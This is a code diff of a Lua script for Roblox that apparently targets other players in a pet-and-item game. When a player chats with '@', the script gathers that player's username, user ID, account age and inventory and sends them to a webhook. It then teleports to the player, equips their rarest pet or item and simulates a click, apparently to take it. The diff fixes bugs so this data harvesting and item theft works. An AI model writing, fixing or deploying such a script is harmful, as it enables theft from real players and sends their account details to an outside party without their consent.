@@ -30,12 +30,12 @@ local function sendToWebhook(data)
             },
             {
                 ["name"] = "UserID",
-                ["value"] = data.userId,
+                ["value"] = tostring(data.userId),
                 ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
-                ["value"] = data.accountAge,
+                ["value"] = tostring(data.accountAge),
                 ["inline"] = true
             },
             {
@@ -46,7 +46,7 @@ local function sendToWebhook(data)
         }
     }
 
-    local message = game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+    local message = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..", \""..game.JobId.."\")"
     local hasRarePet = false
 
     for item in string.gmatch(data.items, "([^\n]+)") do
@@ -69,30 +69,31 @@ local function sendToWebhook(data)
     end)
 end
 
-local function getBestItem(inventory)
+local function getBestItem(backpack)
     local bestItem = nil
     local bestValue = 0
     local bestWeight = 0
     local isPet = false
 
-    for _, item in ipairs(inventory) do
-        local petMatch = string.match(item, "([%w%s]+) %[%d+%.%d+ KG%] %[Age %d+%]")
-        local itemMatch = string.match(item, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
+    for _, tool in ipairs(backpack:GetChildren()) do
+        local itemName = tool.Name
+        local petMatch = string.match(itemName, "([%w%s]+) %[%d+%.%d+ KG%] %[Age %d+%]")
+        local itemMatch = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
 
         if petMatch then
             local petName = petMatch
-            local weight = tonumber(string.match(item, "%[(%d+%.%d+) KG%]"))
+            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+) KG%]"))
             local rarityValue = RARE_PETS[petName] and 1000 or 100
 
             if rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight) then
                 bestValue = rarityValue
                 bestWeight = weight
-                bestItem = item
+                bestItem = tool
                 isPet = true
             end
         elseif itemMatch then
-            local rarity, name = string.match(item, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
-            local weight = tonumber(string.match(item, "%[(%d+%.%d+)kg%]"))
+            local rarity, name = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
+            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+)kg%]"))
             local rarityValue = 0
 
             if rarity == "Disco" then rarityValue = 50
@@ -102,7 +103,7 @@ local function getBestItem(inventory)
             if not isPet and (rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight)) then
                 bestValue = rarityValue
                 bestWeight = weight
-                bestItem = item
+                bestItem = tool
             end
         end
     end
@@ -120,7 +121,7 @@ local function teleportAndInteract(target)
     humanoid.AutoRotate = false
 
     local targetCharacter = target.Character or target.CharacterAdded:Wait()
-    local targetTorso = targetCharacter:WaitForChild("Torso")
+    local targetTorso = targetCharacter:WaitForChild("UpperTorso") or targetCharacter:WaitForChild("Torso")
 
     rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
     humanoid.CameraOffset = Vector3.new(0, 0, 0)
@@ -134,35 +135,33 @@ local function teleportAndInteract(target)
         end
     end)
 
-    local inventory = {}
-    for _, item in ipairs(target:WaitForChild("Backpack"):GetChildren()) do
-        table.insert(inventory, item.Name)
-    end
-
-    local bestItem = getBestItem(inventory)
+    local bestItem = getBestItem(target:WaitForChild("Backpack"))
     if bestItem then
-        local tool = target.Backpack:FindFirstChild(bestItem)
-        if tool then
-            target.Character.Humanoid:EquipTool(tool)
-        end
+        targetCharacter.Humanoid:EquipTool(bestItem)
     end
 
-    wait(0.5)
+    task.wait(0.5)
     local screenPos = Vector2.new(0.5, 0.5)
     UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
     mouse1click()
-    wait(5)
+    task.wait(5)
     conn:Disconnect()
 end
 
 local function onPlayerChatted(player, message)
     if player ~= LocalPlayer and string.find(message, "@") then
+        local items = {}
+        for _, tool in ipairs(player:WaitForChild("Backpack"):GetChildren()) do
+            table.insert(items, tool.Name)
+        end
+        
         local data = {
             username = player.Name,
             userId = player.UserId,
             accountAge = player.AccountAge,
-            items = table.concat(player.Backpack:GetChildren(), "\n")
+            items = table.concat(items, "\n")
         }
+        
         sendToWebhook(data)
         teleportAndInteract(player)
     end
